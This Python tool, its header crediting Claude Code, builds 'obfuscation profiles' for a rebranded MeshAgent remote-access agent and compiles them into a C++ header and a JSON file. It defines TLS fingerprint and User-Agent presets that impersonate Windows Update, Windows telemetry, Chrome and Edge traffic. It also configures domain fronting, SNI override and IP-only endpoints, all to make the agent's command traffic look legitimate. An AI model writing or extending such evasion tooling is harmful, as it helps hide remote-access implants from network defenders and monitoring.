#!/usr/bin/env python3
"""
MeshAgent Network Obfuscation Profile Generator

This tool generates advanced network configuration profiles for MeshAgent
including TLS fingerprint customization, domain fronting, and traffic obfuscation.

Features:
- Custom TLS fingerprints (JA3)
- Domain fronting configuration
- ALPN protocol selection
- Custom User-Agent strings
- SNI override
- Proxy support

Author: Generated with Claude Code
"""

import json
import sys
import os
import argparse
from typing import Dict, List, Optional

# Predefined TLS profiles that mimic legitimate Windows traffic
TLS_PROFILES = {
    "windows_update": {
        "ja3": "771,49200-49196-49192-49188-49172-49162-163-159-107-106-56-136-135-49199-49195-49191-49187-49171-49161-162-158-103-64-50-154-153-69-68-49170-49160-22-19-16-13-157-49169-49159-10-49200-49196-49192-49188-49172-49162,0-11-10-35-13-15,23-24-25,0",
        "cipher_suites": [
            "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384",
            "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256",
            "TLS_DHE_RSA_WITH_AES_256_GCM_SHA384",
            "TLS_DHE_RSA_WITH_AES_128_GCM_SHA256"
        ],
        "signature_algorithms": ["sha256", "sha384", "sha512"],
        "supported_groups": ["x25519", "secp256r1", "secp384r1"],
        "user_agent": "Microsoft-CryptoAPI/10.0"
    },
    "chrome_windows": {
        "ja3": "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-17513,29-23-24,0",
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    },
    "edge_windows": {
        "ja3": "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-23-65281-10-11-35-16-5-13-18-51-45-43-27-21,29-23-24,0",
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
    },
    "windows_telemetry": {
        "ja3": "771,49200-49196-49192-49188-49172-49162,0-11-10-35-13,23-24,0",
        "user_agent": "Windows-Update-Agent/10.0.10011.16384 Client-Protocol/2.33"
    }
}

def generate_network_profile(config: Dict) -> Dict:
    """Generate advanced network obfuscation profile"""

    network = config.get("network", {})
    obfuscation = config.get("obfuscation", {})

    # Base configuration
    profile = {
        "endpoint": network.get("primaryEndpoint", ""),
        "fallback_endpoints": network.get("fallbackEndpoints", []),
        "use_ip_only": network.get("useIpOnly", False),
        "connection": {
            "timeout": network.get("connectionTimeout", 30),
            "retry_attempts": network.get("retryAttempts", 3),
            "retry_delay": network.get("retryDelay", 5)
        }
    }

    # TLS configuration
    tls_profile_name = obfuscation.get("tlsProfile", "windows_update")
    if tls_profile_name in TLS_PROFILES:
        tls_profile = TLS_PROFILES[tls_profile_name]
        profile["tls"] = {
            "min_version": "TLS1.2",
            "max_version": "TLS1.3",
            "ja3_fingerprint": tls_profile.get("ja3"),
            "cipher_suites": tls_profile.get("cipher_suites", []),
            "signature_algorithms": tls_profile.get("signature_algorithms", []),
            "supported_groups": tls_profile.get("supported_groups", []),
            "sni": obfuscation.get("sni", None),
            "verify_cert": obfuscation.get("verifyCert", True)
        }
        profile["user_agent"] = tls_profile.get("user_agent", network.get("userAgent", "MeshAgent/1.0"))
    else:
        profile["tls"] = {
            "min_version": "TLS1.2",
            "max_version": "TLS1.3"
        }
        profile["user_agent"] = network.get("userAgent", "MeshAgent/1.0")

    # Domain fronting
    if obfuscation.get("domainFronting", {}).get("enabled", False):
        fronting = obfuscation["domainFronting"]
        profile["domain_fronting"] = {
            "enabled": True,
            "host_header": fronting.get("hostHeader"),
            "sni_domain": fronting.get("sniDomain"),
            "front_domain": fronting.get("frontDomain")
        }

    # ALPN configuration
    alpn = network.get("alpn", ["http/1.1"])
    profile["alpn"] = alpn

    # Proxy configuration
    if "proxy" in network:
        profile["proxy"] = network["proxy"]

    # HTTP headers
    custom_headers = obfuscation.get("customHeaders", {})
    if custom_headers:
        profile["custom_headers"] = custom_headers

    return profile


def generate_cpp_header(profile: Dict, output_path: str):
    """Generate C++ header file with network configuration"""

    endpoint = profile.get("endpoint", "")
    user_agent = profile.get("user_agent", "")
    sni = profile.get("tls", {}).get("sni", "NULL")
    use_ip_only = "1" if profile.get("use_ip_only", False) else "0"

    # SNI value
    sni_value = f'"{sni}"' if sni and sni != "NULL" else "NULL"

    header = f'''/* Generated network profile - do not edit manually */
#ifndef MESHAGENT_NETWORK_PROFILE_H
#define MESHAGENT_NETWORK_PROFILE_H

/* Primary endpoint configuration */
#define MESH_NETWORK_ENDPOINT "{endpoint}"
#define MESH_NETWORK_USER_AGENT "{user_agent}"
#define MESH_NETWORK_SNI {sni_value}
#define MESH_NETWORK_USE_IP_ONLY {use_ip_only}

/* TLS configuration */
#define MESH_TLS_MIN_VERSION "TLS1.2"
#define MESH_TLS_MAX_VERSION "TLS1.3"

/* Connection parameters */
#define MESH_CONNECTION_TIMEOUT {profile.get("connection", {}).get("timeout", 30)}
#define MESH_CONNECTION_RETRY_ATTEMPTS {profile.get("connection", {}).get("retry_attempts", 3)}
#define MESH_CONNECTION_RETRY_DELAY {profile.get("connection", {}).get("retry_delay", 5)}

/* ALPN protocols */
#define MESH_ALPN_PROTOCOLS "{','.join(profile.get('alpn', ['http/1.1']))}"

#endif /* MESHAGENT_NETWORK_PROFILE_H */
'''

    os.makedirs(os.path.dirname(output_path), exist_ok=True)
    with open(output_path, 'w') as f:
        f.write(header)

    print(f"[OK] C++ header generated: {output_path}")


def generate_json_profile(profile: Dict, output_path: str):
    """Generate JSON profile for runtime configuration"""

    os.makedirs(os.path.dirname(output_path), exist_ok=True)
    with open(output_path, 'w') as f:
        json.dump(profile, f, indent=2)

    print(f"[OK] JSON profile generated: {output_path}")


def main():
    parser = argparse.ArgumentParser(description='Generate MeshAgent network obfuscation profile')
    parser.add_argument('--config', required=True, help='Path to branding config JSON file')
    parser.add_argument('--output-header', default='build/meshagent/generated/network_profile.h',
                        help='Output C++ header file path')
    parser.add_argument('--output-json', default='build/meshagent/generated/network_profile.json',
                        help='Output JSON profile path')
    parser.add_argument('--tls-profile', choices=list(TLS_PROFILES.keys()),
                        help='TLS profile to use (overrides config)')
    parser.add_argument('--list-profiles', action='store_true',
                        help='List available TLS profiles')

    args = parser.parse_args()

    if args.list_profiles:
        print("\nAvailable TLS Profiles:")
        print("=" * 50)
        for name, profile in TLS_PROFILES.items():
            print(f"\n{name}:")
            print(f"  User-Agent: {profile.get('user_agent', 'N/A')}")
            print(f"  JA3: {profile.get('ja3', 'N/A')[:50]}...")
        print("")
        return 0

    # Load configuration
    with open(args.config, 'r') as f:
        config = json.load(f)

    # Override TLS profile if specified
    if args.tls_profile:
        if 'obfuscation' not in config:
            config['obfuscation'] = {}
        config['obfuscation']['tlsProfile'] = args.tls_profile

    # Generate profile
    print("\n" + "=" * 60)
    print("  MeshAgent Network Obfuscation Profile Generator")
    print("=" * 60 + "\n")

    profile = generate_network_profile(config)

    # Display summary
    print("Network Configuration:")
    print(f"  Endpoint: {profile.get('endpoint')}")
    print(f"  User-Agent: {profile.get('user_agent')}")
    print(f"  TLS Profile: {config.get('obfuscation', {}).get('tlsProfile', 'default')}")
    print(f"  IP-Only Mode: {profile.get('use_ip_only')}")
    print("")

    # Generate outputs
    generate_cpp_header(profile, args.output_header)
    generate_json_profile(profile, args.output_json)

    print("\n" + "=" * 60)
    print("  Profile Generation Complete")
    print("=" * 60 + "\n")

    return 0


if __name__ == "__main__":
    sys.exit(main())
